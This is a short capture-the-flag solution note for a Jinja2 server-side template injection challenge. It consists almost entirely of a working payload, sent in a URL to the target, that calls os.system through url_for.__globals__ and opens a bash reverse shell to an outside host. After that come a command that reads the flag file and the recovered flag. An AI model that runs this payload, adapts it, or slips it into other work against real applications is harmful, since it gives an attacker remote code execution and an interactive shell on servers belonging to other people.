Jinja2 SSTI

reverse shell:

`http://185.168.131.123/{{url_for.__globals__.__getitem__('os').system("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'")}}`

`cat flag_secret_file_910230912900891283`

`flag{blacklists_are_insecure_even_if_you_do_not_know_the_bypass_friend_1023092813}`
